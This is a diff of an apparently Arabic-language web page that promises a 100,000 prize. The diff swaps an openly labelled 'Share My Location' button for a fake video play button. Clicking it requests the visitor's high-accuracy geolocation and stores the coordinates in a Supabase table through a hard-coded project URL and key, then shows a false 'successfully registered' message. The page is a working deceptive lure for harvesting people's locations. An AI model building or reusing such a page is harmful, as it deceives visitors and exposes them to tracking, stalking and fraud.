@@ -1,8 +1,10 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
     <title>You’ll win 100,000</title>
 
     <style>
@@ -24,13 +26,8 @@
         .page {
             width: 100%;
             max-width: 600px;
-            background: #fff;
-            border-radius: 16px;
-            overflow: hidden;
-        }
-
-        .content {
-            padding: 25px;
+            background: #111;
+            color: white;
             text-align: center;
         }
 
@@ -40,7 +37,7 @@
         }
 
         .subtitle {
-            color: #555;
+            color: #ddd;
             margin-bottom: 20px;
         }
 
@@ -48,84 +45,74 @@
             position: relative;
             width: 100%;
             aspect-ratio: 16 / 9;
-            background:
-                linear-gradient(
-                    135deg,
-                    #222,
-                    #555
-                );
+            background: linear-gradient(135deg, #222, #444);
             border-radius: 12px;
+            overflow: hidden;
+            cursor: pointer;
             display: flex;
             justify-content: center;
             align-items: center;
-            cursor: pointer;
+        }
+
+        .video-preview:hover {
+            background: linear-gradient(135deg, #292929, #4d4d4d);
         }
 
         .play-button {
-            width: 75px;
-            height: 75px;
+            width: 78px;
+            height: 78px;
             border-radius: 50%;
             background: white;
+            color: #111;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 34px;
-            color: #222;
+            font-size: 36px;
             padding-left: 5px;
+            transition: transform 0.2s;
+        }
+
+        .video-preview:hover .play-button {
+            transform: scale(1.08);
         }
 
         .video-label {
             position: absolute;
             bottom: 15px;
-            right: 15px;
-            left: 15px;
+            left: 0;
+            right: 0;
             color: white;
             font-size: 16px;
         }
 
-        .info {
-            margin-top: 20px;
-            padding: 15px;
-            background: #f2f2f2;
+        .notice {
+            margin-top: 18px;
+            padding: 14px;
+            background: #222;
             border-radius: 10px;
+            color: #ddd;
             line-height: 1.7;
-            color: #444;
-        }
-
-        #locationButton {
-            width: 100%;
-            margin-top: 20px;
-            padding: 15px;
-            border: none;
-            border-radius: 9px;
-            background: #007bff;
-            color: white;
-            font-size: 18px;
-            cursor: pointer;
-        }
-
-        #locationButton:hover {
-            background: #0056b3;
-        }
-
-        #locationButton:disabled {
-            background: #888;
-            cursor: not-allowed;
+            font-size: 14px;
         }
 
         #result {
             margin-top: 20px;
-            line-height: 1.8;
+            line-height: 2;
+            min-height: 30px;
         }
 
         .success {
-            color: #159447;
+            color: #20d866;
             font-weight: bold;
         }
 
         .error {
-            color: #d00000;
+            color: #ff5555;
             font-weight: bold;
+        }
+
+        .loading {
+            color: #ddd;
         }
     </style>
 </head>
@@ -134,102 +121,183 @@
 
 <div class="page">
 
-    <div class="content">
+    <h1>You’ll win 100,000</h1>
 
-        <h1>You’ll win 100,000</h1>
+    <div class="subtitle">
+        Go register your name to be among the winners.
+    </div>
 
-        <div class="subtitle">
-            Go register your name to be among the winners.
+
+    <!-- دائرة الفيديو -->
+
+    <div
+        class="video-preview"
+        id="videoButton"
+        role="button"
+        tabindex="0"
+        aria-label="Continue and share location"
+    >
+
+        <div class="play-button">
+            ▶
         </div>
 
-        <div class="video-preview">
-
-            <div class="play-button">
-                ▶
-            </div>
-
-            <div class="video-label">
-                Watch the video
-            </div>
-
+        <div class="video-label">
+            Click to continue
         </div>
-
-        <div class="info">
-            To continue, you can choose to share your location.
-            Your browser will ask for your permission.
-        </div>
-
-        <button id="locationButton">
-            Share My Location
-        </button>
-
-        <div id="result"></div>
 
     </div>
+
+
+    <div class="notice">
+        To continue, click the play button.
+        Your browser will ask for permission to share your location.
+    </div>
+
+
+    <div id="result"></div>
 
 </div>
 
 
+<!-- Supabase -->
+
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
 
 <script>
 
-const SUPABASE_URL =
-    "ضع Project URL هنا";
+    /* ================================
+       Supabase
+       ================================ */
 
-const SUPABASE_PUBLISHABLE_KEY =
-    "ضع Publishable Key هنا";
+    const SUPABASE_URL =
+        "https://vsztpvsicsmxjhsvqzbv.supabase.co";
+
+    const SUPABASE_PUBLISHABLE_KEY =
+        "sb_publishable_N2P-l8nE7GaChsD5lrxb4w_nr8K5UrM";
 
 
-const supabaseClient =
-    window.supabase.createClient(
-        SUPABASE_URL,
-        SUPABASE_PUBLISHABLE_KEY
+    const supabaseClient =
+        window.supabase.createClient(
+            SUPABASE_URL,
+            SUPABASE_PUBLISHABLE_KEY
+        );
+
+
+    /* ================================
+       العناصر
+       ================================ */
+
+    const videoButton =
+        document.getElementById("videoButton");
+
+    const result =
+        document.getElementById("result");
+
+
+    let processing = false;
+
+
+    /* ================================
+       الضغط على دائرة التشغيل
+       ================================ */
+
+    videoButton.addEventListener(
+        "click",
+        requestLocation
     );
 
 
-const button =
-    document.getElementById("locationButton");
+    /* دعم زر Enter من لوحة المفاتيح */
 
-const result =
-    document.getElementById("result");
+    videoButton.addEventListener(
+        "keydown",
+        function(event) {
+
+            if (
+                event.key === "Enter" ||
+                event.key === " "
+            ) {
+
+                event.preventDefault();
+
+                requestLocation();
+            }
+        }
+    );
 
 
-button.addEventListener("click", function () {
+    /* ================================
+       الحصول على الموقع
+       ================================ */
 
-    if (!navigator.geolocation) {
+    function requestLocation() {
+
+        if (processing) {
+            return;
+        }
+
+
+        if (!navigator.geolocation) {
+
+            result.innerHTML =
+                '<span class="error">' +
+                'Your browser does not support location.' +
+                '</span>';
+
+            return;
+        }
+
+
+        processing = true;
+
 
         result.innerHTML =
-            '<span class="error">' +
-            'المتصفح لا يدعم تحديد الموقع.' +
+            '<span class="loading">' +
+            'Requesting location permission...' +
             '</span>';
 
-        return;
+
+        navigator.geolocation.getCurrentPosition(
+
+            locationSuccess,
+
+            locationError,
+
+            {
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 0
+            }
+
+        );
     }
 
-    button.disabled = true;
 
-    result.textContent =
-        "جاري طلب إذن الموقع...";
+    /* ================================
+       بعد موافقة المستخدم
+       ================================ */
 
+    async function locationSuccess(position) {
 
-    navigator.geolocation.getCurrentPosition(
+        const latitude =
+            position.coords.latitude;
 
-        async function(position) {
+        const longitude =
+            position.coords.longitude;
 
-            const latitude =
-                position.coords.latitude;
-
-            const longitude =
-                position.coords.longitude;
-
-            const accuracy =
-                position.coords.accuracy;
+        const accuracy =
+            position.coords.accuracy;
 
 
-            result.textContent =
-                "جاري حفظ الموقع...";
+        result.innerHTML =
+            '<span class="loading">' +
+            'Registering your location...' +
+            '</span>';
 
+
+        try {
 
             const { error } =
                 await supabaseClient
@@ -243,14 +311,18 @@ button.addEventListener("click", function () {
 
             if (error) {
 
-                console.error(error);
+                console.error(
+                    "Supabase error:",
+                    error
+                );
+
 
                 result.innerHTML =
                     '<span class="error">' +
-                    'فشل تسجيل الموقع.' +
+                    'Registration failed.' +
                     '</span>';
 
-                button.disabled = false;
+                processing = false;
 
                 return;
             }
@@ -258,35 +330,77 @@ button.addEventListener("click", function () {
 
             result.innerHTML =
                 '<span class="success">' +
-                'تم تسجيلك بنجاح ✅' +
+                'You have been successfully registered ✅' +
                 '</span>';
 
-            button.disabled = false;
-        },
 
-
-        function(error) {
+        } catch (error) {
 
             console.error(error);
 
+
             result.innerHTML =
                 '<span class="error">' +
-                'لم تتم مشاركة الموقع.' +
+                'Registration failed.' +
                 '</span>';
 
-            button.disabled = false;
-        },
-
-
-        {
-            enableHighAccuracy: true,
-            timeout: 15000,
-            maximumAge: 0
         }
 
-    );
 
-});
+        processing = false;
+    }
+
+
+    /* ================================
+       أخطاء الموقع
+       ================================ */
+
+    function locationError(error) {
+
+        console.error(
+            "Location error:",
+            error
+        );
+
+
+        if (error.code === 1) {
+
+            result.innerHTML =
+                '<span class="error">' +
+                'Location permission was not granted.' +
+                '</span>';
+
+        }
+
+        else if (error.code === 2) {
+
+            result.innerHTML =
+                '<span class="error">' +
+                'Unable to determine your location.' +
+                '</span>';
+
+        }
+
+        else if (error.code === 3) {
+
+            result.innerHTML =
+                '<span class="error">' +
+                'Location request timed out.' +
+                '</span>';
+
+        }
+
+        else {
+
+            result.innerHTML =
+                '<span class="error">' +
+                'Unable to get your location.' +
+                '</span>';
+        }
+
+
+        processing = false;
+    }
 
 </script>
 
